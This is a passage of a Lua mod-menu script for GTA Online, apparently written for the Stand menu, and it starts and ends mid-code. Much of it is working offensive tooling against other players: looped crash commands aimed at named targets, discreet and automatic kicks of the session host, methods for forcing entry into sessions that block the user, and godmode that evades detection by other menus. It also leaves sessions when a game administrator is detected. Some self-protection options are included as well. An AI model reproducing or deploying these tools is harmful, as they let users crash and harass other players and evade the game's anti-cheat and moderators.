            --notification("BDSM sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("choke" .. players.get_name(pid))
            util.yield(1000)
        end)

        menu.toggle_loop(standcrash, "Indecent Exposure", {"toggleflashcrash"}, "Blocked by popular menus.", function(on_loop)
            --notification("Indecent Exposure sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("flashcrash" .. players.get_name(pid))
            util.yield(1000)
        end)

        menu.toggle_loop(standcrash, "Next-Gen", {"togglengcrash"}, "Blocked by popular menus.", function(on_loop)
            --notification("Next-Gen sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("ngcrash" .. players.get_name(pid))
            util.yield(1000)
        end)

        menu.toggle_loop(standcrash, "Steamroller", {"togglesteamroll"}, "Note: This crash will also affect other players close to your target.", function(on_loop)
            --notification("Steamroller sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("steamroll" .. players.get_name(pid))
            util.yield(1000)
        end)

        menu.toggle_loop(standcrash, "Burger King Foot Lettuce", {"togglefootlettuce"}, "Can't be blocked without consequences, but the target might karma you for using it.", function(on_loop)
            --notification("Burger King Foot Lettuce sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("footlettuce" .. players.get_name(pid))
            util.yield(1000)
        end)

        menu.toggle_loop(standcrash, "Vehicular Manslaughter", {"toggleslaughter"}, "A discrete kick that won't tell the target who did it. Unblockable when you are the host.", function(on_loop)
            --notification("Vehicular Manslaughter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
            menu.trigger_commands("slaughter" .. players.get_name(pid))
            util.yield(1000)
        end)



	menu.divider(crash, "Before Crashes")

    local acams = menu.list(crash, "Anti Crash Cam", {}, "")

	menu.action(acams, "[ON/OFF] Anti Crash Camera", {"acamoff"}, "Deactivates ped regen,invisibility, levitate, freecam, reducedcollision, nocollision, showcamall, confusecamall, potatomode, stops all sound events and unblocks all connections", function()
        menu.trigger_commands("anticrashcam")
    end)

	menu.toggle(acams, "Panic Mode", {"panicmode"}, "This will render you basically uncrashable at the cost of disrupting all gameplay", function(on_toggle)
		local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
		local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
		local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
		local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
		if on_toggle then
			--notification("Toggling panic mode on... Get those cunts", colors.red)
			menu.trigger_commands("desyncall on")
			menu.trigger_command(BlockIncSyncs)
			menu.trigger_command(BlockNetEvents)
			menu.trigger_commands("anticrashcamera on")
		else
			--notification("toggling panic mode off...", colors.red)
			menu.trigger_commands("desyncall off")
			menu.trigger_command(UnblockIncSyncs)
			menu.trigger_command(UnblockNetEvents)
			menu.trigger_commands("anticrashcamera off")
		end
	end)

    menu.toggle(crash, "Block Player", {"block"}, "Shortcut to blocking the player join reaction ", function()
        --notification("Blocked " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        menu.trigger_commands("historyblock" .. players.get_name(pid))
    end)

	menu.action(troll_sub_vehicle_tab, "Car Ram", {"ram"}, "Don't drink and drive, folks", function()
    	--notification("Ram that bitch!!! " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
		util.yield(1500)
		local hash = util.joaat("baller")
		local PlayerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
		if STREAMING.IS_MODEL_A_VEHICLE(hash) then
			STREAMING.REQUEST_MODEL(hash)
			while not STREAMING.HAS_MODEL_LOADED(hash) do
				util.yield()
			end
			local Coords1 = PlayerCoords.y + 10
			local Coords2 = PlayerCoords.y - 10
			local veh1 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords1, PlayerCoords.z, 180, true, false, true)
			local veh2 = VEHICLE.CREATE_VEHICLE(hash, PlayerCoords.x, Coords2, PlayerCoords.z, 0, true, false, true)
			-- Do stuff with veh ...
			ENTITY.SET_ENTITY_VELOCITY(veh1, 0, -100, 0)
			ENTITY.SET_ENTITY_VELOCITY(veh2, 0, 100, 0)
		end
		util.yield(5000)
		menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off")
	end)

end

--------------------------------------


local function get_transition_state(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 230))
end

local function get_interior_player_is_in(pid)
    return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
end


local unreleased_vehicles = {
    "virtue",
    "eudora",
    "boor",
    "broadway",
    "cargoplane2",
    "everon2",
    "issi8",
    "manchez3",
    "panthere2",
    "powersurge",
}

local modded_vehicles = {
    "dune2",
    "tractor",
    "dilettante2",
    "asea2",
    "cutter",
    "mesa2",
    "jet",
    "policeold1",
    "policeold2",
    "armytrailer2",
    "towtruck",
    "towtruck2",
    "cargoplane",
}

local modded_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
    "weapon_emplauncher",
    "weapon_digiscanner",
    "weapon_raypistol",
    "weapon_firework",
    "weapon_stungun",
    "weapon_flare",
}

local all_weapons = {
    "weapon_railgun",
    "weapon_stungun",
    "weapon_digiscanner",
    "weapon_emplauncher",
    "weapon_digiscanner",
    "weapon_raypistol",
    "weapon_firework",
    "weapon_flare",
    "WEAPON_KNIFE",
    "WEAPON_NIGHTSTICK",
    "weapon_bottle",
    "weapon_unarmed",
    "WEAPON_HAMMER",
    "WEAPON_BAT",
    "WEAPON_GOLFCLUB",
    "WEAPON_CROWBAR",
    "WEAPON_PISTOL",
    "WEAPON_COMBATPISTOL",
    "WEAPON_APPISTOL",
    "WEAPON_PISTOL50",
    "WEAPON_MICROSMG",
    "WEAPON_SMG",
    "WEAPON_ASSAULTSMG",
    "WEAPON_ASSAULTRIFLE",
  --"weapon_flashlight",
    "weapon_hatchet",
    "weapon_knuckle",
    "weapon_machete",
    "weapon_dagger",
    "weapon_switchblade",
    "weapon_wrench",
    "weapon_battleaxe",
    "weapon_poolcue",
    "weapon_pistol_mk2",
    "weapon_snspistol",
    "weapon_snspistol_mk2",
    "weapon_heavypistol",
    "weapon_vintagepistol",
    "weapon_flaregun",
    "weapon_marksmanpistol",
    "weapon_revolver",
    "weapon_revolver_mk2",
    "weapon_doubleaction",
    "weapon_ceramicpistol",
    "weapon_navyrevolver",
    "weapon_smg_mk2",
    "weapon_combatpdw",
    "weapon_machinepistol",
    "weapon_minismg",
    "weapon_raycarbine",
    "weapon_pumpshotgun",
    "weapon_pumpshotgun_mk2",
    "weapon_sawnoffshotgun",
    "weapon_assaultshotgun",
    "weapon_bullpupshotgun",
    "weapon_musket",
    "weapon_heavyshotgun",
    "weapon_dbshotgun",
    "weapon_autoshotgun",
    "weapon_assaultrifle",
    "weapon_assaultrifle_mk2",
    "weapon_carbinerifle",
    "weapon_carbinerifle_mk2",
    "weapon_advancedrifle",
    "weapon_specialcarbine",
    "weapon_specialcarbine_mk2",
    "weapon_bullpuprifle",
    "weapon_bullpuprifle_mk2",
    "weapon_compactrifle",
    "weapon_mg",
    "weapon_combatmg",
    "weapon_combatmg_mk2",
    "weapon_gusenberg",
    "weapon_sniperrifle",
    "weapon_heavysniper",
    "weapon_heavysniper_mk2",
    "weapon_marksmanrifle",
    "weapon_marksmanrifle_mk2",
    "weapon_rpg",
    "weapon_grenadelauncher",
    "weapon_grenadelauncher_smoke",
    "weapon_minigun",
    "weapon_hominglauncher",
    "weapon_compactlauncher",
    "weapon_rayminigun",
    "weapon_grenade",
    "weapon_bzgas",
    "weapon_molotov",
    "weapon_proxmine",
    "weapon_snowball",
    "weapon_pipebomb",
    "weapon_ball",
    "weapon_smokegrenade",
    "weapon_stickybomb",
    "weapon_petrolcan",
    "weapon_parachute",
    "weapon_fireextinguisher",
    "weapon_hazardcan",
}


local proofs = {
    bullet = {name="Bullets",on=false},
    fire = {name="Fire",on=false},
    explosion = {name="Explosions",on=false},
    collision = {name="Collision",on=false},
    melee = {name="Melee",on=false},
    steam = {name="Steam",on=false},
    drown = {name="Drowning",on=false},
}


local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local interior_stuff = {0, 233985, 169473, 169729, 169985, 170241, 177665, 177409, 185089, 184833, 184577, 163585, 167425, 167169}

local self = menu.list(menu.my_root(), "Protections", {}, "")


--most clone functions use "CLONE_PED_TO_TARGET" or "CLONE_PED" 2 natives
--if there is a new way of cloning, it may not be able to clean up successfully
--im a beginner in lua so this script has a lot to improve

--[[
menu.toggle_loop(self, "Transition Helper", {"transitionhelper"}, "Prevent getting stuck due to clearing your own character model in advance during the transition", function()
    if util.is_session_transition_active() then --CORE
        menu.trigger_commands("BlockClones off")
    end
    util.yield(6000) --it may also be stuck at the moment the transition is completed, wait for a while
    menu.trigger_commands("BlockClones on")
end)
]]

menu.toggle_loop(self, "Block Clones", {"blockclones"}, "Detects And Blocks Clones.", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
        util.toast("Clone model detected. Clearing...")
        entities.delete_by_handle(ped)
        util.yield(100)
        end
    end
end)

menu.toggle(self, "Join Player's Crash Protections", {"joinprotect"}, "This is best for when joining people that are crashing as session. Stops your position being updated for other players and can even prevent other players from knowing that you're in the session if joining with this enabled.", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("anticrashcamera")
        menu.trigger_commands("desyncall")
        menu.trigger_commands("fpsnsboost")
--      menu.trigger_commands("noentities")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        util.toast("Activated, now enter your session and prepare the kick/crash.")
        util.yield(100)
    else
        menu.trigger_commands("anticrashcamera")
        menu.trigger_commands("desyncall")
        menu.trigger_commands("fpsnsboost")
--      menu.trigger_commands("noentities")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        util.toast("Done, all off")
        util.yield(100)
        end
    end)

    menu.toggle(self, "Hide RAW --notifications", {"hiderawnotifs"}, "", function(on_toggle)
        local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Enabled")
        local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Disabled")
        if on_toggle then
            menu.trigger_command(UnShowNotis)
			menu.trigger_commands("clearnotifs")
            util.yield(100)
        else
            menu.trigger_command(ShowNotis)
            end
        end)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local bypasskick = menu.list(self, "Bypass Kicks", {}, "Options that allow you to use methods to n enter the session if you are being blocked.")

menu.divider(bypasskick, "Normal Methods")

menu.toggle(bypasskick, "Method V1", {}, "It gives you a limited time for you to expel the one who blocks you", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        util.toast("Done, all off")
    end
end)

menu.toggle(bypasskick, "Method V2", {}, "A little more functional but also with more network errors", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        util.toast("Done, all off")
    end
end)

menu.toggle(bypasskick, "Method V3", {}, "More functional method, but for developers, you will receive --notification of all network events", function(on_toggle)
local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Enabled")
local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Disabled")
local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
if on_toggle then
    menu.trigger_commands("nobgscript on")
    menu.trigger_command(BlockIncSyncs)
    menu.trigger_command(BlockNetEvents)
    menu.trigger_command(BlockBailing, "on")
    menu.trigger_command(BlockBailing2, "on")
    menu.trigger_command(BlockBailing3, "on")
    menu.trigger_command(BlockBailing4, "on")
    menu.trigger_command(ShowNotis)
    menu.trigger_command(BlockRaw)
    util.toast("Activated, now enter your session and prepare the kick")
else
    menu.trigger_commands("nobgscript off")
    menu.trigger_command(UnblockIncSyncs)
    menu.trigger_command(UnblockNetEvents)
    menu.trigger_command(BlockBailing3, "off")
    menu.trigger_command(UnShowNotis)
    menu.trigger_command(UnBlockRaw)
    util.toast("Done, all off")
end
end)

menu.toggle(bypasskick, "Method V4", {}, "Probably break the game, use at your own risk", function(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    local BlockBailing = menu.ref_by_path("Online>Protections>Block Bailing>Player No Longer In Session")
    local BlockBailing2 = menu.ref_by_path("Online>Protections>Block Bailing>Switching Primary Crew")
    local BlockBailing3 = menu.ref_by_path("Online>Protections>Block Bailing>Spectating Related")
    local BlockBailing4 = menu.ref_by_path("Online>Protections>Block Bailing>Other Reasons")
    local ShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Enabled")
    local BlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnShowNotis = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>--notification>Disabled")
    local UnBlockRaw = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local DontAsk = menu.ref_by_path("Online>Transitions>Speed Up>Don't Ask For Permission To Spawn")
    if on_toggle then
        menu.trigger_commands("nobgscript on")
		menu.trigger_commands("skipbroadcast on")
        menu.trigger_commands("speedupspawn on")
        menu.trigger_commands("speedupfmmc on")
        menu.trigger_commands("skipswoopdown on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_command(BlockBailing, "on")
        menu.trigger_command(BlockBailing2, "on")
        menu.trigger_command(BlockBailing3, "on")
        menu.trigger_command(BlockBailing4, "on")
        menu.trigger_command(ShowNotis)
        menu.trigger_command(BlockRaw)
        menu.trigger_commands("skipbroadcast on")
        menu.trigger_command(DontAsk, "on")
        menu.trigger_commands("skipswoopdown on")
        util.toast("Activated, now enter your session and prepare the kick")
    else
        menu.trigger_commands("nobgscript off")
		menu.trigger_commands("skipbroadcast off")
        menu.trigger_commands("speedupspawn off")
        menu.trigger_commands("speedupfmmc off")
        menu.trigger_commands("skipswoopdown off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_command(BlockBailing3, "off")
        menu.trigger_command(UnShowNotis)
        menu.trigger_command(UnBlockRaw)
        menu.trigger_commands("skipbroadcast off")
        menu.trigger_command(DontAsk, "off")
        menu.trigger_commands("skipswoopdown off")
        util.toast("Done, all off")
        end
    end)

local proofsList = menu.list(self, "Godmode Editor", {}, "")
local immortalityCmd = menu.ref_by_path("Self>Immortality")
for _,data in pairs(proofs) do
    menu.toggle(proofsList, data.name, {data.name:lower().."proof"}, "Makes you invulnerable to "..data.name:lower()..".", function(toggle)
        data.on = toggle
    end)
end
util.create_tick_handler(function()
    local player = players.user_ped()
    if not menu.get_value(immortalityCmd) then
        ENTITY.SET_ENTITY_PROOFS(player, proofs.bullet.on, proofs.fire.on, proofs.explosion.on, proofs.collision.on, proofs.melee.on, proofs.steam.on, false, proofs.drown.on)
    end
end)

menu.toggle_loop(self, "Admin Bail", {}, "If it detects an R* admin it changes your session.", function(on)
    bailOnAdminJoin = on
end)

if bailOnAdminJoin then
    if players.is_marked_as_admin(player_id) then
        util.toast(players.get_name(player_id) .. " If there is an admin, for another session.")
        menu.trigger_commands("quickbail")
        return
    end
end


menu.toggle_loop(self, "Block PFTX/Particulate Lag", {}, "", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)


menu.toggle_loop(self, "Ghost PvP Players", {}, "", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if PLAYER.IS_PLAYER_FREE_AIMING(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else 
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end)

local ghost = false
local ghostCmd
local ghostCmd = menu.toggle(self, "Auto Ghost Godmode Players", {}, "", function(toggle)
    ghost = toggle

    if not ghost then
        for _, pid in ipairs(players.list(false, true, true)) do
            NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid, false)
        end
    return end


    while ghost do 
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            for i, interior in ipairs(interior_stuff) do
                if (players.is_godmode(pid) or not ENTITY._GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                    NETWORK._SET_RELATIONSHIP_TO_PLAYER(pid, true)
                    break
                end
            end
        end 
        util.yield()
    end
end)

menu.toggle_loop(self, "Stealth Vehicle Godmode On", {}, "Won't be detected as vehicle godmode by most menus. Note: Save your profile now to keep it on.", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(self, "Stealth Vehicle Godmode Off", {}, "Turns off Godmode for the vehicle", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), false, false, false, false, false, 0, 0, false)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), true), true, true, true, true, true, 0, 0, true)
end)


local detections = menu.list(menu.my_root(), "Modder Detections", {}, "")

--[[
-------------------------------------------\\\\\Ryze Script Code by Picoles/////-------------------------------------------
local aimkrma = menu.list(detections, "Aim Karma", {}, "You can do something to people who are aiming at you.")

    playerIsTargetingEntity = function(playerPed)
        local playerList = players.list(true, true, true)
        for k, playerPid in pairs(playerList) do
            if PLAYER.IS_PLAYER_TARGETTING_ENTITY(playerPid, playerPed) or PLAYER.IS_PLAYER_FREE_AIMING_AT_ENTITY  (playerPid, playerPed) then 
                if not isWhitelisted(playerPid) then
                    karma[playerPed] = {
                        pid = playerPid, 
                        ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(playerPid)
                    }
                    return true 
                end
            end
        end
        karma[playerPed] = nil
        return false 
    end,

    local karma = {}
    menu.toggle_loop(aimkrma, "Shoot", {}, "Will shoot them if they aim at you.", function()
        if playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] then
            local pos = ENTITY.GET_ENTITY_COORDS(karma[PLAYER.PLAYER_PED_ID()].ped)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z +0.1, 100, true, 100416529, PLAYER.PLAYER_PED_ID(), true, false, 100.0)
            util.yield(loopdelayMS + (loopdelaySEC * 1000) + (loopdelayMIN * 1000 * 60))
        end
    end)
    
    menu.toggle_loop(aimkrma, "Explode", {}, "Will explode them if they aim at you.", function()
        if playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] then
            --explodePlayer(karma[PLAYER.PLAYER_PED_ID()].ped, true)
        end
    end)
    
    menu.toggle_loop(aimkrma, "Remove GodMode", {}, "If the player has a shitty menu will work.", function()
        if playerIsTargetingEntity(PLAYER.PLAYER_PED_ID()) and karma[PLAYER.PLAYER_PED_ID()] and players.is_godmode(karma[PLAYER.PLAYER_PED_ID()].pid) then
            local karmaPid = karma[PLAYER.PLAYER_PED_ID()].pid
            util.trigger_script_event(1 << karmaPid, {801199324, karmaPid, 869796886})
        end
    end)
------------------------------------------------^^^Ryze Script Code by Picoles^^^------------------------------------------------
]]

local aim_det = menu.list(detections, "Aim Detection", {}, "")

local auto_punish = menu.list(detections, "Aim Punishments", {}, "")

local autohost = menu.list(detections, "Host Detection", {}, "")

    menu.toggle_loop(aim_det, "Aim Detection", {}, "Detects if someone is aiming a weapon at you.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            for i, hash in ipairs(all_weapons) do
            local weapon_hash = util.joaat(hash)
            if PLAYER.IS_PLAYER_FREE_AIMING(pid, ped, weapon_hash) and PLAYER.IS_PLAYER_TARGETTING_ENTITY(pid, ped, weapon_hash) then
                util.draw_debug_text(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.log(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
            else 
                util.yield(100)
                end
            end
        end
    end)

    menu.toggle_loop(auto_punish, "Auto Snipe", {}, "Detects if someone is aiming a weapon at you, then shoots them back them.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            for i, hash in ipairs(all_weapons) do
            local weapon_hash = util.joaat(hash)
            if PLAYER.IS_PLAYER_FREE_AIMING(pid, ped, weapon_hash) and PLAYER.IS_PLAYER_TARGETTING_ENTITY(pid, ped, weapon_hash) then
                menu.trigger_commands("osnipel" .. players.get_name(pid))
                util.yield(1000)
                menu.trigger_commands("osnipel" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.log(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
            else 
                util.yield(100)
                end
            end
        end
    end)

    menu.toggle_loop(auto_punish, "Auto Firework", {}, "Detects if someone is aiming a weapon at you, then shoots fireworks at them.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            for i, hash in ipairs(all_weapons) do
            local weapon_hash = util.joaat(hash)
            if PLAYER.IS_PLAYER_FREE_AIMING(pid, ped, weapon_hash) and PLAYER.IS_PLAYER_TARGETTING_ENTITY(pid, ped, weapon_hash) then
                menu.trigger_commands("fireworkon" .. players.get_name(pid))
                util.yield(1000)
                menu.trigger_commands("fireworkon" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.log(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
            else 
                util.yield(100)
                end
            end
        end
    end)

    menu.toggle_loop(auto_punish, "Auto Atomizer", {}, "Detects if someone is aiming a weapon at you, then shoots atomizer at them.", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            for i, hash in ipairs(all_weapons) do
            local weapon_hash = util.joaat(hash)
            if PLAYER.IS_PLAYER_FREE_AIMING(pid, ped, weapon_hash) and PLAYER.IS_PLAYER_TARGETTING_ENTITY(pid, ped, weapon_hash) then
                menu.trigger_commands("atomizeron" .. players.get_name(pid))
                util.yield(1000)
                menu.trigger_commands("atomizeron" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
                util.log(players.get_name(pid) .. " Is Aiming A Weapon" .. "(" .. hash .. ")")
            else 
                util.yield(100)
                end
            end
        end
    end)

menu.toggle_loop(autohost, "Is Host", {}, "Detects if someone host", function()
    util.draw_debug_text(players.get_name(players.get_host()) .. " Is Host")
end)

menu.toggle_loop(autohost, "Auto Kick Host", {}, "Detects if someone host, then kicks them this is best for basic and regular users.", function()
    util.draw_debug_text(players.get_name(players.get_host()) .. " Is Host")
    menu.trigger_commands("blast" .. players.get_name(players.get_host()))
end)

--[[

local moneydet = menu.list(detections, "Money", {}, "")

menu.toggle_loop(moneydet, "Money", {"money"}, "Shares the name of the richest and poorest players.", function()
    util.draw_debug_text(players.get_name(players.get_money(pid)))
end)

]]

local gdmedits = menu.list(detections, "Godmode", {}, "")
menu.toggle_loop(gdmedits, "Godmode", {}, "Detects if someone is using godmode.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
